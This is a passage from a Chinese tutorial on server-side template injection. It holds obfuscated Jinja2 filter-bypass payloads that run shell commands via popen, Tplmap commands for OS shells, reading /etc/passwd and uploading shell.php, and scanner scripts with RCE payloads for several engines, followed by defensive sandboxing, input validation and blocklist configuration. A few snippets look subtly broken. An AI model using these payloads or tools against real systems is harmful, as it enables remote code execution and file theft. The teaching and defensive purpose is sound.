{{cycler|attr('__init__')}}
{{joiner|attr('__init__')}}
{{namespace|attr('__init__')}}
```

**3. 括号过滤绕过**：

```jinja2
{# 使用过滤器链 #}
{{()|attr('__class__')|attr('__base__')|attr('__subclasses__')|first}}

{# 使用list过滤器 #}
{{config|list|first}}

{# 使用dictsort #}
{{config|dictsort|first|first}}
```

#### 注释利用

```jinja2
{# Jinja2注释隐藏Payload #}
{{7*7}}{# 探测Payload #}

{# 多行注释 #}
{{#__class__
__bases__
__subclasses__#}}

{# 注释中隐藏真实Payload #}
{# 这是正常的注释 {{().__class__}} #}
{{().__class__}}

{# 利用注释进行混淆 #}
{{()/*__class__*/.__class__}}
```

#### 综合WAF绕过Payload

```jinja2
{# === 综合绕过示例1：过滤了__class__、__bases__等 === #}
{{()|attr(['__cl','ass__']|join)|attr(['__ba','ses__']|join)|attr('__getit'+'em__')(0)|attr(['__subcl','asses__']|join)()|attr('__getit'+'em__')(137)|attr(['__in','it__']|join)|attr(['__glob','als__']|join)|attr('get')('po'+'pen')('cat /flag')|attr('read')()}}

{# === 综合绕过示例2：过滤了点号和下划线 === #}
{{request|attr('application')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('__import__')('os')|attr('popen')('id')|attr('read')()}}

{# === 综合绕过示例3：使用lipsum对象绕过 === #}
{{lipsum|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('cat /flag')|attr('read')()}}

{# === 综合绕过示例4：使用cycler对象 === #}
{{cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('__builtins__')|attr('__getitem__')('eval')('__import__("os").popen("id").read()')}}

{# === 综合绕过示例5：使用joiner对象 === #}
{{joiner|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}

{# === 综合绕过示例6：完全无下划线 === #}
{{request|attr(request.args.c|list|slice(2,3)|first|join)}}{% set c = request.args.c|list|slice(2,3)|first|join %}

{# === 综合绕过示例7：使用namespace === #}
{% set ns = namespace() %}{% set ns.a = ().__class__ %}{{ns.a.__base__.__subclasses__()[137].__init__.__globals__['popen']('whoami').read()}}

{# === 综合绕过示例8：使用Unicode编码 === #}
{{()|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fbase\x5f\x5f')|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(137)|attr('\x5f\x5finit\x5f\x5f')|attr('\x5f\x5fglobals\x5f\x5f')|attr('get')('popen')('id')|attr('read')()}}

{# === 综合绕过示例9：使用chr构造字符串 === #}
{% set chr = ().__class__.__base__.__subclasses__()[137].__init__.__globals__.__builtins.chr %}{% set class = chr(95)~chr(95)~chr(99)~chr(108)~chr(97)~chr(115)~chr(115)~chr(95)~chr(95) %}{{()|attr(class)}}

{# === 综合绕过示例10：使用format和join组合 === #}
{{()|attr('{0}{1}{2}{3}{4}{5}{6}{7}{8}'.format(chr(95),chr(95),chr(99),chr(108),chr(97),chr(115),chr(115),chr(95),chr(95)))}}
```

---

## 自动化工具

### Tplmap

#### Tplmap简介

Tplmap是一款专为SSTI（服务端模板注入）漏洞设计的自动化检测和利用工具。它支持多种模板引擎，包括Jinja2、Twig、Smarty、FreeMarker、Velocity、ERB等，能够自动识别目标使用的模板引擎并提供相应的利用方式。

**主要功能：**
- 自动检测SSTI漏洞
- 识别模板引擎类型
- 执行系统命令
- 获取交互式Shell
- 文件读写操作
- 信息收集（配置、环境变量等）

#### 安装方法

**方式一：通过Git克隆安装**

```bash
# 克隆仓库
git clone https://github.com/epinna/tplmap.git

# 进入目录
cd tplmap

# 安装依赖
pip install -r requirements.txt

# 验证安装
python tplmap.py --help
```

**方式二：直接下载使用**

```bash
# 下载并解压
wget https://github.com/epinna/tplmap/archive/refs/heads/master.zip
unzip master.zip
cd tplmap-master
pip install -r requirements.txt
```

**依赖要求：**
- Python 2.7 或 Python 3.x
- requests
- PyYAML
- certifi

#### 基本使用方法

**GET请求检测：**

```bash
# 基础检测
python tplmap.py -u "http://target.com/page?name=test"

# 指定参数检测
python tplmap.py -u "http://target.com/page?name=test&age=20" -p name

# 使用Cookie
python tplmap.py -u "http://target.com/page?name=test" --cookie "session=xxx"
```

**POST请求检测：**

```bash
# 基础POST检测
python tplmap.py -u "http://target.com/page" -d "name=test"

# JSON格式数据
python tplmap.py -u "http://target.com/api" -d '{"name": "test"}' --content-type json

# 指定Content-Type
python tplmap.py -u "http://target.com/page" -d "name=test" -H "Content-Type: application/x-www-form-urlencoded"
```

**获取交互式Shell：**

```bash
# 获取操作系统Shell
python tplmap.py -u "http://target.com/page?name=test" --os-shell

# 获取代码执行Shell
python tplmap.py -u "http://target.com/page?name=test" --os-cmd "whoami"
```

#### 常用参数说明

| 参数 | 说明 | 示例 |
|------|------|------|
| `-u, --url` | 目标URL | `-u "http://target.com/page"` |
| `-p, --parameter` | 指定测试参数 | `-p name` |
| `-d, --data` | POST数据 | `-d "name=test&age=20"` |
| `-c, --cookie` | 设置Cookie | `-c "session=xxx"` |
| `-H, --header` | 自定义请求头 | `-H "User-Agent: Mozilla/5.0"` |
| `--level` | 检测级别(1-5) | `--level 5` |
| `--os-shell` | 获取交互式Shell | `--os-shell` |
| `--os-cmd` | 执行单条命令 | `--os-cmd "cat /etc/passwd"` |
| `--upload` | 上传文件 | `--upload local.txt /remote/path` |
| `--download` | 下载文件 | `--download /remote/file local.txt` |
| `--force-level` | 强制指定模板引擎 | `--force-level 27` |
| `--injection-tag` | 自定义注入标签 | `--injection-tag "{{*}}"` |

#### 实际使用示例

**示例1：基础漏洞检测**

```bash
# 检测目标是否存在SSTI漏洞
python tplmap.py -u "http://vulnerable.com/greeting?name=Guest"

# 输出示例：
# [+] Tplmap identified the following injection point:
#   Engine: Jinja2
#   Injection: name
#   Context: text
#   OS: Linux
#   Technique: render
#   Capabilities: shell, read, write, evaluate
```

**示例2：执行系统命令**

```bash
# 执行单条命令
python tplmap.py -u "http://vulnerable.com/greeting?name=Guest" --os-cmd "id"

# 获取交互式Shell
python tplmap.py -u "http://vulnerable.com/greeting?name=Guest" --os-shell
# tplmap > whoami
# www-data
# tplmap > cat /etc/passwd
# root:x:0:0:root:/root:/bin/bash
# ...
```

**示例3：文件操作**

```bash
# 读取远程文件
python tplmap.py -u "http://vulnerable.com/greeting?name=Guest" --download "/etc/passwd" ./passwd.txt

# 上传文件到远程服务器
python tplmap.py -u "http://vulnerable.com/greeting?name=Guest" --upload ./shell.php /var/www/html/shell.php
```

**示例4：带Cookie和Header的检测**

```bash
# 需要认证的页面
python tplmap.py -u "http://vulnerable.com/profile?bio=test" \
  -c "session=eyJ1c2VyIjoiYWRtaW4ifQ==; token=xxx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
  -H "X-Requested-With: XMLHttpRequest"
```

**示例5：批量检测**

```bash
# 使用高级别检测（更彻底但速度较慢）
python tplmap.py -u "http://vulnerable.com/page?name=test" --level 5

# 强制指定模板引擎类型
python tplmap.py -u "http://vulnerable.com/page?name=test" --force-level 27
```

**示例6：JSON数据格式**

```bash
# 检测API接口
python tplmap.py -u "http://api.vulnerable.com/render" \
  -d '{"template": "Hello {{name}}", "name": "test"}' \
  --content-type json \
  -p name
```

---

### 其他检测工具

#### Burp Suite插件

**1. SSTI Scanner**

Burp Suite的专业版提供了SSTI Scanner扩展，可以自动检测模板注入漏洞。

```
安装步骤：
1. 打开Burp Suite
2. 进入 Extender -> BApp Store
3. 搜索 "SSTI"
4. 安装 "SSTI Scanner" 插件
5. 在扫描配置中启用SSTI检测
```

**2. Template Injection Extension**

社区开发的模板注入检测插件，支持多种模板引擎的Payload生成。

```
功能特点：
- 自动生成各类模板引擎的检测Payload
- 支持自定义Payload
- 提供漏洞利用代码片段
- 集成到Repeater和Intruder
```

**3. 使用Burp Intruder进行Fuzzing**

```python
# 在Intruder中使用的Payload列表
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
*{7*7}
@{7*7}
[[7*7]]
${T(java.lang.Runtime).getRuntime().exec('calc')}
{{dump(app)}}
{{config.items()}}
{{request.application.__globals__}}
```

#### 在线检测工具

**1. HackBar浏览器插件**

```
功能：
- 快速构造SSTI测试Payload
- URL编码/解码
- Base64编码/解码
- 常用Payload快捷输入
```

**2. Postman / Insomnia**

用于手动测试API接口的SSTI漏洞：

```bash
# 保存常用测试请求
# 1. 创建Collection
# 2. 添加请求，包含各类SSTI Payload
# 3. 使用环境变量管理目标URL
# 4. 批量发送测试请求
```

#### 自定义检测脚本

**Python检测脚本示例：**

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SSTI漏洞检测脚本
用于批量检测目标URL的模板注入漏洞
"""

import requests
import sys
import argparse
from urllib.parse import urljoin, parse_qs, urlparse

# 各类模板引擎的检测Payload
PAYLOADS = {
    'jinja2': [
        '{{7*7}}',
        '{{7+7}}',
        '{{config}}',
        "{{''.__class__.__mro__[1].__subclasses__()}}"
    ],
    'twig': [
        '{{7*7}}',
        '{{dump(app)}}',
        '{{_self.env.registerUndefinedFilterCallback("exec")}}'
    ],
    'smarty': [
        '{7*7}',
        '{php}echo 7*7;{/php}',
        '{fetch file="file:///etc/passwd"}'
    ],
    'freemarker': [
        '${7*7}',
        '${.data_model}',
        '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}'
    ],
    'velocity': [
        '#set($a=7*7)${a}',
        '#set($e="e")#set($ec=$e.getClass().forName("java.lang.Runtime"))#set($rt=$ec.getRuntime())#set($cmd=$rt.exec("id"))'
    ],
    'erb': [
        '<%= 7*7 %>',
        '<%= system("whoami") %>',
        '<%= `id` %>'
    ],
    'ejs': [
        '<%= 7*7 %>',
        '<%= global.process.mainModule.require("child_process").execSync("id").toString() %>'
    ],
    'general': [
        '${7*7}',
        '{{7*7}}',
        '<%= 7*7 %>',
        '${{7*7}}',
        '#{7*7}',
        '*{7*7}',
        '@{7*7}',
        '[[7*7]]'
    ]
}

# 期望的响应特征（用于判断漏洞存在）
INDICATORS = {
    '49': 'Jinja2/Twig/其他',
    '14': '数学运算成功',
    'true': '布尔值解析',
    'false': '布尔值解析',
    '<class': 'Python对象泄露',
    'java.lang': 'Java对象泄露',
    'root:': '文件读取成功',
    'www-data': '命令执行成功'
}


def detect_ssti(url, parameter=None, method='GET', data=None, headers=None, cookies=None):
    """
    检测目标URL是否存在SSTI漏洞
    """
    if headers is None:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
    
    results = []
    
    for engine, payloads in PAYLOADS.items():
        print(f"[*] 正在检测 {engine} 类型...")
        
        for payload in payloads:
            try:
                if method.upper() == 'GET':
                    # GET请求
                    separator = '&' if '?' in url else '?'
                    test_url = f"{url}{separator}{parameter}={payload}" if parameter else url
                    response = requests.get(test_url, headers=headers, cookies=cookies, timeout=10)
                else:
                    # POST请求
                    post_data = data.copy() if data else {}
                    if parameter:
                        post_data[parameter] = payload
                    response = requests.post(url, data=post_data, headers=headers, cookies=cookies, timeout=10)
                
                # 分析响应
                for indicator, desc in INDICATORS.items():
                    if indicator in response.text:
                        results.append({
                            'engine': engine,
                            'payload': payload,
                            'indicator': indicator,
                            'description': desc,
                            'response_length': len(response.text)
                        })
                        print(f"[+] 发现潜在漏洞! 引擎: {engine}, Payload: {payload}")
                        print(f"    特征: {indicator} ({desc})")
                        break
                        
            except requests.RequestException as e:
                print(f"[-] 请求失败: {e}")
                continue
    
    return results


def generate_report(results, output_file='ssti_report.txt'):
    """
    生成检测报告
    """
    with open(output_file, 'w', encoding='utf-8') as f:
        f.write("=" * 60 + "\n")
        f.write("SSTI漏洞检测报告\n")
        f.write("=" * 60 + "\n\n")
        
        if not results:
            f.write("未发现SSTI漏洞\n")
        else:
            f.write(f"发现 {len(results)} 个潜在漏洞:\n\n")
            for i, result in enumerate(results, 1):
                f.write(f"[{i}] 模板引擎: {result['engine']}\n")
                f.write(f"    Payload: {result['payload']}\n")
                f.write(f"    特征: {result['indicator']}\n")
                f.write(f"    描述: {result['description']}\n")
                f.write(f"    响应长度: {result['response_length']}\n")
                f.write("-" * 40 + "\n")
    
    print(f"[*] 报告已保存到: {output_file}")


def main():
    parser = argparse.ArgumentParser(description='SSTI漏洞检测工具')
    parser.add_argument('-u', '--url', required=True, help='目标URL')
    parser.add_argument('-p', '--parameter', help='测试参数名')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'], help='请求方法')
    parser.add_argument('-d', '--data', help='POST数据 (格式: key1=value1&key2=value2)')
    parser.add_argument('-c', '--cookie', help='Cookie字符串')
    parser.add_argument('-o', '--output', default='ssti_report.txt', help='输出报告文件')
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("SSTI漏洞检测工具")
    print("=" * 60)
    print(f"目标: {args.url}")
    print(f"参数: {args.parameter}")
    print(f"方法: {args.method}")
    print("=" * 60)
    
    # 解析POST数据
    post_data = None
    if args.data:
        post_data = {}
        for item in args.data.split('&'):
            if '=' in item:
                k, v = item.split('=', 1)
                post_data[k] = v
    
    # 解析Cookie
    cookies = None
    if args.cookie:
        cookies = {}
        for item in args.cookie.split(';'):
            if '=' in item:
                k, v = item.strip().split('=', 1)
                cookies[k] = v
    
    # 执行检测
    results = detect_ssti(
        url=args.url,
        parameter=args.parameter,
        method=args.method,
        data=post_data,
        cookies=cookies
    )
    
    # 生成报告
    generate_report(results, args.output)
    
    print("\n[*] 检测完成!")


if __name__ == '__main__':
    main()
```

**使用方法：**

```bash
# 基础检测
python ssti_scanner.py -u "http://target.com/page" -p name

# POST请求检测
python ssti_scanner.py -u "http://target.com/api" -m POST -p template -d "template=test&user=admin"

# 带Cookie检测
python ssti_scanner.py -u "http://target.com/profile" -p bio -c "session=xxx; token=yyy"

# 指定输出文件
python ssti_scanner.py -u "http://target.com/page" -p name -o result.txt
```

**Bash一键检测脚本：**

```bash
#!/bin/bash
# SSTI快速检测脚本

TARGET_URL=$1
PARAMETER=$2

echo "=========================================="
echo "SSTI快速检测脚本"
echo "目标: $TARGET_URL"
echo "参数: $PARAMETER"
echo "=========================================="

# 通用检测Payloads
PAYLOADS=(
    "{{7*7}}"
    "\${7*7}"
    "<%= 7*7 %>"
    "\${{7*7}}"
    "#{7*7}"
    "*{7*7}"
    "@{7*7}"
    "[[7*7]]"
)

echo "[*] 开始检测..."
for payload in "${PAYLOADS[@]}"; do
    echo "[*] 测试Payload: $payload"
    
    # URL编码Payload
    encoded_payload=$(echo -n "$payload" | python3 -c "import sys,urllib.parse;print(urllib.parse.quote(sys.stdin.read()))")
    
    # 发送请求
    if [[ "$TARGET_URL" == *"?"* ]]; then
        response=$(curl -s "${TARGET_URL}&${PARAMETER}=${encoded_payload}")
    else
        response=$(curl -s "${TARGET_URL}?${PARAMETER}=${encoded_payload}")
    fi
    
    # 检查结果
    if echo "$response" | grep -q "49\|14"; then
        echo "[+] 发现漏洞! Payload: $payload"
        echo "    响应包含计算结果"
    fi
done

echo "[*] 检测完成"
```

**使用Bash脚本：**

```bash
chmod +x ssti_quick_check.sh
./ssti_quick_check.sh "http://target.com/page" "name"
```

---

## 防御措施

### 安全编码实践

#### 输入验证和过滤

对用户输入进行严格的验证和过滤是防御SSTI的第一道防线。

```python
# 白名单验证 - 只允许特定字符
import re

def validate_input(user_input, pattern=r'^[a-zA-Z0-9_\-]+$'):
    """
    白名单验证：只允许字母、数字、下划线和连字符
    """
    if not user_input:
        return False
    return re.match(pattern, user_input) is not None

# 使用示例
user_input = request.args.get('name', '')
if not validate_input(user_input):
    return "Invalid input", 400
```

```python
# 黑名单过滤 - 过滤危险字符和关键词
def sanitize_input(user_input):
    """
    黑名单过滤：移除模板注入相关的危险字符
    """
    dangerous_patterns = [
        r'\{\{.*?\}\}',      # Jinja2/Twig 表达式
        r'\{%.*?%\}',         # Jinja2/Twig 控制结构
        r'\$\{.*?\}',         # 表达式
        r'\#\{.*?\}',         # Ruby/SpEL 表达式
        r'<\%=.*?\%>',        # ERB 表达式
        r'\$\{.*?\}',         # JSP/EL 表达式
        r'__class__',         # Python 属性
        r'__bases__',         # Python 属性
        r'__subclasses__',    # Python 属性
        r'__init__',          # Python 属性
        r'__globals__',       # Python 属性
        r'eval\s*\(',         # eval函数
        r'exec\s*\(',         # exec函数
        r'system\s*\(',       # system函数
        r'popen\s*\(',        # popen函数
        r'import',            # import关键字
    ]
    
    for pattern in dangerous_patterns:
        user_input = re.sub(pattern, '', user_input, flags=re.IGNORECASE)
    
    return user_input
```

```java
// Java 输入验证示例
public class InputValidator {
    private static final Pattern SAFE_PATTERN = Pattern.compile("^[a-zA-Z0-9\\s_-]+$");
    
    public static boolean isValid(String input) {
        if (input == null || input.isEmpty()) {
            return false;
        }
        return SAFE_PATTERN.matcher(input).matches();
    }
    
    // 过滤模板表达式
    public static String sanitizeTemplate(String input) {
        return input
            .replaceAll("\\$\\{", "")
            .replaceAll("#\\{", "")
            .replaceAll("<%", "")
            .replaceAll("%>", "")
            .replaceAll("\\{\\{", "")
            .replaceAll("\\}\\}", "");
    }
}
```

#### 使用安全的API

```python
# Flask - 使用 render_template 而不是 render_template_string
from flask import Flask, render_template, request

app = Flask(__name__)

# 危险做法：使用 render_template_string 且直接拼接用户输入
@app.route('/unsafe')
def unsafe():
    name = request.args.get('name', '')
    # 危险！用户输入直接拼接到模板
    return render_template_string(f'<h1>Hello {name}</h1>')

# 安全做法：使用 render_template 配合静态模板文件
@app.route('/safe')
def safe():
    name = request.args.get('name', '')
    # 安全：使用静态模板文件，用户输入作为变量传递
    return render_template('hello.html', name=name)
```

```html
<!-- templates/hello.html -->
<!DOCTYPE html>
<html>
<head>
    <title>Safe Template</title>
</head>
<body>
    <!-- Jinja2 自动转义用户输入 -->
    <h1>Hello {{ name }}</h1>
</body>
</html>
```

```python
# Django - 使用模板文件和自动转义
from django.shortcuts import render
from django.http import HttpResponse

def safe_view(request):
    name = request.GET.get('name', '')
    # Django 模板默认启用自动转义
    return render(request, 'hello.html', {'name': name})
```

#### 避免用户输入直接渲染

```python
# 危险做法：用户输入直接作为模板内容
@app.route('/dangerous', methods=['POST'])
def dangerous():
    template_content = request.form.get('template', '')
    # 极度危险！用户输入被当作模板执行
    return render_template_string(template_content)

# 安全做法：使用静态模板，用户输入仅作为数据
@app.route('/safe', methods=['POST'])
def safe():
    user_content = request.form.get('content', '')
    # 安全：用户输入作为纯文本数据传递
    return render_template('display.html', content=user_content)
```

```php
<?php
// PHP - 避免用户输入进入模板
// 危险做法
$template = $_GET['template'];
echo $twig->render($template);  // 危险！

// 安全做法
$user_input = $_GET['name'];
echo $twig->render('fixed-template.html', ['name' => $user_input]);
?>
```

---

### 模板引擎安全配置

#### Jinja2安全配置

```python
from jinja2 import Environment, BaseLoader, select_autoescape
from jinja2.sandbox import SandboxedEnvironment

# 1. 启用沙箱环境
env = SandboxedEnvironment(
    loader=BaseLoader(),
    autoescape=select_autoescape(['html', 'xml']),
    enable_async=False
)

# 2. 禁用危险的全局函数和变量
env.globals.clear()  # 清除所有全局变量
env.filters.clear()  # 清除所有过滤器（可选）

# 3. 只允许安全的过滤器
ALLOWED_FILTERS = ['safe', 'escape', 'upper', 'lower', 'trim', 'length']
for filter_name in list(env.filters.keys()):
    if filter_name not in ALLOWED_FILTERS:
        del env.filters[filter_name]

# 4. 使用模板时传递最小化的上下文
template = env.from_string('Hello {{ name }}')
result = template.render(name=user_input)
```

```python
# Flask Jinja2 安全配置
app = Flask(__name__)

# 禁用模板自动重载（生产环境）
app.config['TEMPLATES_AUTO_RELOAD'] = False

# 启用自动转义
app.jinja_env.autoescape = True

# 移除危险的全局变量
app.jinja_env.globals.pop('request', None)
app.jinja_env.globals.pop('config', None)
app.jinja_env.globals.pop('session', None)
app.jinja_env.globals.pop('g', None)

# 或者使用沙箱环境
from jinja2.sandbox import SandboxedEnvironment
app.jinja_env = SandboxedEnvironment(
    loader=app.jinja_env.loader,
    autoescape=True
)
```

#### Twig安全配置

```php
<?php
use Twig\Environment;
use Twig\Loader\ArrayLoader;
use Twig\Extension\SandboxExtension;
use Twig\Sandbox\SecurityPolicy;
use Twig\Sandbox\SecurityError;

// 1. 创建沙箱安全策略
$tags = ['if', 'for', 'set'];
$filters = ['upper', 'lower', 'escape', 'e', 'trim', 'length'];
$methods = [];
$properties = [];
$functions = ['range', 'cycle', 'constant'];

$policy = new SecurityPolicy($tags, $filters, $methods, $properties, $functions);

// 2. 配置Twig环境
$loader = new ArrayLoader([
    'template.html' => 'Hello {{ name }}',
]);
$twig = new Environment($loader, [
    'autoescape' => 'html',
    'debug' => false,
]);

// 3. 启用沙箱扩展
$sandbox = new SandboxExtension($policy, true);
$twig->addExtension($sandbox);

// 4. 渲染模板（在沙箱中执行）
try {
    echo $twig->render('template.html', ['name' => $user_input]);
} catch (SecurityError $e) {
    echo "Security violation: " . $e->getMessage();
}
?>
```

```php
<?php
// Symfony Twig 安全配置
# config/packages/twig.yaml
twig:
    autoescape: 'html'
    debug: '%kernel.debug%'
    strict_variables: '%kernel.debug%'
    # 禁用危险的函数和过滤器
    globals:
        # 不要在这里暴露敏感对象
    # 使用沙箱模式
    sandbox:
        enabled: true
        tags: ['if', 'for', 'set', 'include']
        filters: ['upper', 'lower', 'escape', 'e']
        methods: []
        properties: []
        functions: ['range', 'cycle']
?>
```

#### FreeMarker安全配置

```java
// FreeMarker 安全配置
import freemarker.template.Configuration;
import freemarker.template.Template;
import freemarker.template.TemplateExceptionHandler;
import freemarker.core.TemplateClassResolver;

public class FreeMarkerConfig {
    
    public static Configuration createSafeConfiguration() {
        Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
        
        // 1. 禁用危险的内置函数
        cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
        // 或者完全禁用：cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
        
        // 2. 禁用API访问
        cfg.setAPIBuiltinEnabled(false);
        
        // 3. 设置安全的异常处理
        cfg.setTemplateExceptionHandler(TemplateExceptionHandler.RETHROW_HANDLER);
        
        // 4. 禁用自动包含和自动导入
        cfg.setAutoIncludes(Collections.emptyList());
        cfg.setAutoImports(Collections.emptyMap());
        
        // 5. 设置模板加载路径（限制模板来源）
        cfg.setClassForTemplateLoading(FreeMarkerConfig.class, "/templates");
        
        return cfg;
    }
}
```

```java
// 使用 ObjectWrapper 限制对象访问
import freemarker.template.DefaultObjectWrapper;
import freemarker.template.ObjectWrapper;
import freemarker.template.TemplateModel;
import freemarker.template.SimpleScalar;

public class SafeObjectWrapper extends DefaultObjectWrapper {
    
    public SafeObjectWrapper() {
        super(Configuration.VERSION_2_3_31);
    }
    
    @Override
    protected TemplateModel handleUnknownType(Object obj) {
        // 只允许基本类型
        if (obj instanceof String || 
            obj instanceof Number || 
            obj instanceof Boolean) {
            return super.handleUnknownType(obj);
        }
        // 拒绝其他类型
        return new SimpleScalar("[Restricted]");
    }
}

// 应用配置
cfg.setObjectWrapper(new SafeObjectWrapper());
```

#### Velocity安全配置

```java
// Velocity 安全配置
import org.apache.velocity.app.VelocityEngine;
import org.apache.velocity.runtime.RuntimeConstants;
import org.apache.velocity.runtime.resource.loader.ClasspathResourceLoader;

public class VelocitySecurityConfig {
    
    public static VelocityEngine createSafeEngine() {
        VelocityEngine ve = new VelocityEngine();
        
        // 1. 禁用危险的指令
        ve.setProperty(RuntimeConstants.UBERSPECT_CLASSNAME, 
            "org.apache.velocity.util.introspection.SecureUberspector");
        
        // 2. 限制模板加载路径
        ve.setProperty(RuntimeConstants.RESOURCE_LOADER, "classpath");
        ve.setProperty("classpath.resource.loader.class", 
            ClasspathResourceLoader.class.getName());
        
        // 3. 禁用宏库自动加载
        ve.setProperty(RuntimeConstants.VM_LIBRARY, "");
        
        // 4. 禁用 #parse 和 #include 的绝对路径
        ve.setProperty(RuntimeConstants.PARSER_POOL_SIZE, "20");
        
        // 5. 启用严格模式
        ve.setProperty(RuntimeConstants.STRICT_REFERENCES, "true");
        
        ve.init();
        return ve;
    }
}
```

```java
// 使用 SecureUberspector 限制方法调用
import org.apache.velocity.util.introspection.SecureUberspector;
import org.apache.velocity.util.introspection.VelPropertyGet;

public class CustomSecureUberspector extends SecureUberspector {
    
    @Override
    public VelPropertyGet getPropertyGet(Object obj, String identifier, 
                                         Info i) {
        // 阻止访问危险属性
        if (identifier.startsWith("__") || 
            identifier.equals("class") ||
            identifier.equals("getClass")) {
            return null;
        }
        return super.getPropertyGet(obj, identifier, i);
    }
}
```

---

### 输入过滤和沙箱加固

#### 白名单验证

```python
# 严格的字段白名单验证
from typing import List, Dict, Any

class InputValidator:
    # 定义允许的字段和类型
    ALLOWED_FIELDS = {
        'username': str,
        'email': str,
        'age': int,
        'is_active': bool
    }
    
    @classmethod
    def validate(cls, data: Dict[str, Any]) -> Dict[str, Any]:
        """
        只保留白名单中的字段
        """
        validated = {}
        for field, field_type in cls.ALLOWED_FIELDS.items():
            if field in data:
                try:
                    validated[field] = field_type(data[field])
                except (ValueError, TypeError):
                    raise ValueError(f"Invalid type for field: {field}")
        return validated

# 使用示例
user_data = {
    'username': 'john_doe',
    'email': 'john@example.com',
    'age': '25',
    'is_active': 'true',
    'malicious_field': '{{7*7}}'  # 这将被过滤掉
}

safe_data = InputValidator.validate(user_data)
```

```python
# HTML 内容白名单过滤
from html.parser import HTMLParser
from html.entities import name2codepoint

class HTMLWhitelistParser(HTMLParser):
    """
    只允许特定的HTML标签和属性
    """
    ALLOWED_TAGS = {'p', 'br', 'strong', 'em', 'u', 'h1', 'h2', 'h3', 'h4', 'h5', 'h6'}
    ALLOWED_ATTRIBUTES = {}
    
    def __init__(self):
        super().__init__()
        self.result = []
        self.skip_content = False
    
    def handle_starttag(self, tag, attrs):
        if tag in self.ALLOWED_TAGS:
            attrs_str = ' '.join(f'{k}="{v}"' for k, v in attrs 
                                if k in self.ALLOWED_ATTRIBUTES.get(tag, []))
            if attrs_str:
                self.result.append(f'<{tag} {attrs_str}>')
            else:
                self.result.append(f'<{tag}>')
        else:
            self.skip_content = True
    
    def handle_endtag(self, tag):
        if tag in self.ALLOWED_TAGS:
            self.result.append(f'</{tag}>')
        self.skip_content = False
    
    def handle_data(self, data):
        if not self.skip_content:
            # 转义特殊字符
            data = data.replace('&', '&amp;') \
                       .replace('<', '&lt;') \
                       .replace('>', '&gt;') \
                       .replace('"', '&quot;')
            self.result.append(data)
    
    def get_clean_html(self):
        return ''.join(self.result)

def sanitize_html(html_content):
    parser = HTMLWhitelistParser()
    parser.feed(html_content)
    return parser.get_clean_html()
```

#### 危险函数禁用

```python
# Python - 创建受限的执行环境
import builtins
import types

def create_restricted_globals():
    """
    创建受限的全局命名空间，移除危险函数
    """
    # 复制安全的内置函数
    safe_builtins = {
        'True': True,
        'False': False,
        'None': None,
        'str': str,
        'int': int,
        'float': float,
        'bool': bool,
        'list': list,
        'tuple': tuple,
        'dict': dict,
        'set': set,
        'frozenset': frozenset,
        'len': len,
        'range': range,
        'enumerate': enumerate,
        'zip': zip,
        'map': map,
        'filter': filter,
        'sum': sum,
        'min': min,
        'max': max,
        'abs': abs,
        'round': round,
        'pow': pow,
        'divmod': divmod,
        'chr': chr,
        'ord': ord,
        'hex': hex,
        'oct': oct,
        'bin': bin,
        'format': format,
        'repr': repr,
        'sorted': sorted,
        'reversed': reversed,
        'isinstance': isinstance,
        'hasattr': hasattr,
        'getattr': getattr,
        'setattr': setattr,
        'delattr': delattr,
        'type': type,
        'id': id,
        'hash': hash,
        'iter': iter,
        'next': next,
        'slice': slice,
    }
    
    return {'__builtins__': safe_builtins}

# 危险函数列表（需要禁用的）
DANGEROUS_FUNCTIONS = [
    'eval', 'exec', 'compile', '__import__', 'open',
    'input', 'raw_input', 'reload', 'exit', 'quit',
    'help', 'dir', 'vars', 'locals', 'globals',
    'object.__subclasses__', 'object.__bases__',
    'object.__class__', 'object.__mro__',
]
```

```java
// Java - 使用 SecurityManager 限制代码执行
import java.security.*;

public class TemplateSecurityManager extends SecurityManager {
    
    @Override
    public void checkExec(String cmd) {
        throw new SecurityException("Command execution is not allowed");
    }
    
    @Override
    public void checkRead(String file) {
        // 只允许读取特定目录
        if (!file.startsWith("/allowed/path/")) {
            throw new SecurityException("File read access denied: " + file);
        }
    }
    
    @Override
    public void checkWrite(String file) {
        throw new SecurityException("File write is not allowed");
    }
    
    @Override
    public void checkDelete(String file) {
        throw new SecurityException("File deletion is not allowed");
    }
    
    @Override
    public void checkConnect(String host, int port) {
        throw new SecurityException("Network access is not allowed");
    }
}

// 应用 SecurityManager
System.setSecurityManager(new TemplateSecurityManager());
```

```python
# 使用 RestrictedPython 创建安全的执行环境
# pip install RestrictedPython

from RestrictedPython import compile_restricted
from RestrictedPython.Guards import safe_builtins

def execute_restricted_code(code):
    """
    在受限环境中执行代码
    """
    restricted_globals = {
        '__builtins__': safe_builtins,
        '_getattr_': getattr,
        '_setattr_': setattr,
        '_delattr_': delattr,
        '_write_': lambda x: x,
    }
    
    try:
        compiled = compile_restricted(code, '<inline>', 'exec')
        exec(compiled, restricted_globals)
    except Exception as e:
        print(f"Execution blocked: {e}")
```

#### 沙箱环境配置

```python
# Docker 沙箱 - 隔离模板渲染环境
import docker
import tempfile
import os

def render_in_sandbox(template_content, context, timeout=5):
    """
    在 Docker 容器中渲染模板，实现完全隔离
    """
    client = docker.from_env()
    
    # 创建临时目录
    with tempfile.TemporaryDirectory() as tmpdir:
        # 写入模板文件
        template_path = os.path.join(tmpdir, 'template.html')
        with open(template_path, 'w') as f:
            f.write(template_content)
        
        # 写入上下文数据（JSON）
        context_path = os.path.join(tmpdir, 'context.json')
        import json
